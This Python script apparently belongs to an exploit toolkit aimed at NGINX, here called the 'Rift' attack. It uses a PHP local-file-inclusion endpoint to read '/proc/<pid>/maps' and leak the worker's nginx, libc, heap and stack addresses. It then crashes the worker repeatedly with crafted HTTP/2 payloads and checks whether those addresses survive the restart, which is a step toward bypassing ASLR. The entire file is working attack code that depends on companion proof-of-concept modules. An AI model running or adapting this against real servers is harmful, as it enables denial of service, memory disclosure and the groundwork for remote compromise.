#!/usr/bin/env python3
"""Measure NGINX worker layout stability across controlled Rift crashes."""

from __future__ import annotations

import argparse
import secrets
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import nginx_rifter as rifter
import poc


def make_target(args: argparse.Namespace) -> rifter.RifterTarget:
    host, port = rifter.parse_target(args.target, args.port)
    return rifter.RifterTarget(
        host,
        port,
        scheme=args.scheme,
        endpoint=args.lfi_endpoint,
        file_param=args.file_param,
        offset_param=args.offset_param,
        length_param=args.length_param,
        template=args.file_read_template,
        phpinfo_path="",
        timeout=args.timeout,
    )


def snapshot(target: rifter.RifterTarget, args: argparse.Namespace) -> dict:
    facts, php_uid, master_pid = rifter.find_worker(target, args.max_pid, args.pid_file)
    maps_text = target.lfi_text(f"/proc/{facts.worker_pid}/maps", timeout=args.timeout)
    mappings = rifter.parse_maps(maps_text)
    first_heap = facts.heap_ranges[0][0] if facts.heap_ranges else None
    stack = next((m for m in mappings if m.path == "[stack]"), None)
    anon_rw = [
        (m.start, m.end)
        for m in mappings
        if m.perms.startswith("rw") and not m.path
    ]

    return {
        "master_pid": master_pid,
        "php_uid": php_uid,
        "worker_pid": facts.worker_pid,
        "worker_uid": facts.worker_uid,
        "nginx_rw_base": facts.nginx_rw_base,
        "nginx_path": facts.nginx_path,
        "libc_base": facts.libc_base,
        "libc_path": facts.libc_path,
        "heap_base": first_heap,
        "heap_ranges": facts.heap_ranges,
        "stack_base": stack.start if stack else None,
        "anon_rw_count": len(anon_rw),
    }


def print_snapshot(label: str, snap: dict) -> None:
    heap = "none" if snap["heap_base"] is None else f"{snap['heap_base']:#x}"
    stack = "none" if snap["stack_base"] is None else f"{snap['stack_base']:#x}"
    print(
        f"{label:<10} pid={snap['worker_pid']:<6} "
        f"master={snap['master_pid']:<6} "
        f"nginx_rw={snap['nginx_rw_base']:#x} "
        f"libc={snap['libc_base']:#x} "
        f"heap={heap} stack={stack}",
        flush=True,
    )


def compare(before: dict, after: dict) -> dict:
    return {
        "worker_changed": before["worker_pid"] != after["worker_pid"],
        "same_master": before["master_pid"] == after["master_pid"],
        "same_nginx_rw": before["nginx_rw_base"] == after["nginx_rw_base"],
        "same_libc": before["libc_base"] == after["libc_base"],
        "same_heap": before["heap_base"] == after["heap_base"],
        "same_stack": before["stack_base"] == after["stack_base"],
    }


def print_comparison(cycle: int, crashed: bool, delta: dict) -> None:
    fields = [
        f"crashed={str(crashed).lower()}",
        f"worker_changed={str(delta['worker_changed']).lower()}",
        f"master_stable={str(delta['same_master']).lower()}",
        f"nginx_stable={str(delta['same_nginx_rw']).lower()}",
        f"libc_stable={str(delta['same_libc']).lower()}",
        f"heap_stable={str(delta['same_heap']).lower()}",
        f"stack_stable={str(delta['same_stack']).lower()}",
    ]
    print(f"cycle {cycle:<2} " + " ".join(fields), flush=True)


def controlled_crash(host: str, port: int, args: argparse.Namespace) -> bool:
    nonce = secrets.token_bytes(6)
    body = poc.make_slot_probe_body(
        nonce,
        marker_offset=args.slot_marker_offset,
        stride=args.slot_stride,
    )
    return poc.attempt(
        host,
        port,
        rifter.low_bytes(args.probe_crash_addr, args.target_len),
        body,
        h2_victim=True,
        a_count=args.a_count,
        plus_count=args.plus_count,
    )


def run(args: argparse.Namespace) -> int:
    host, port = rifter.parse_target(args.target, args.port)
    target = make_target(args)

    print(f"target      {host}:{port}")
    print(f"primitive   LFI maps only; no /proc/<pid>/mem or core parsing")
    print(f"cycles      {args.cycles}")
    print()

    stable_counts = {
        "same_master": 0,
        "same_nginx_rw": 0,
        "same_libc": 0,
        "same_heap": 0,
        "same_stack": 0,
    }
    successful_crashes = 0

    for cycle in range(1, args.cycles + 1):
        before = snapshot(target, args)
        print_snapshot(f"before {cycle}", before)

        crashed = controlled_crash(host, port, args)
        if crashed:
            successful_crashes += 1

        if not poc.wait_alive(host, port, timeout=args.recovery_timeout):
            print("worker did not recover in time", file=sys.stderr)
            return 2

        time.sleep(args.post_recovery_delay)
        after = snapshot(target, args)
        print_snapshot(f"after {cycle}", after)
        delta = compare(before, after)
        print_comparison(cycle, crashed, delta)
        print()

        for key in stable_counts:
            if delta[key]:
                stable_counts[key] += 1

    print("summary")
    print(f"  crash oracle observed      {successful_crashes}/{args.cycles}")
    for key, count in stable_counts.items():
        print(f"  {key:<24} {count}/{args.cycles}")

    return 0


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Measure whether NGINX worker mappings remain stable after controlled Rift crashes."
    )
    parser.add_argument("--target", default=rifter.DEFAULT_TARGET, help="target as HOST:PORT")
    parser.add_argument("--port", type=int, default=19321, help="fallback port when --target omits one")
    parser.add_argument("--scheme", choices=("http", "https"), default="http")
    parser.add_argument("--lfi-endpoint", default="/lfi.php")
    parser.add_argument("--file-param", default="file")
    parser.add_argument("--offset-param", default="offset")
    parser.add_argument("--length-param", default="length")
    parser.add_argument("--file-read-template")
    parser.add_argument("--pid-file", action="append", default=list(rifter.DEFAULT_PID_FILES))
    parser.add_argument("--max-pid", type=int, default=4096)
    parser.add_argument("--timeout", type=float, default=5)
    parser.add_argument("--cycles", type=int, default=3)
    parser.add_argument("--recovery-timeout", type=int, default=30)
    parser.add_argument("--post-recovery-delay", type=float, default=0.25)
    parser.add_argument("--target-len", type=int, default=6)
    parser.add_argument("--probe-crash-addr", type=rifter.parse_addr, default=rifter.DEFAULT_PROBE_CRASH_ADDR)
    parser.add_argument("--a-count", type=int, default=rifter.DEFAULT_A_COUNT)
    parser.add_argument("--plus-count", type=int, default=rifter.DEFAULT_PLUS_COUNT)
    parser.add_argument("--slot-marker-offset", type=int, default=24)
    parser.add_argument("--slot-stride", type=int, default=8)
    return parser


if __name__ == "__main__":
    raise SystemExit(run(build_parser().parse_args()))
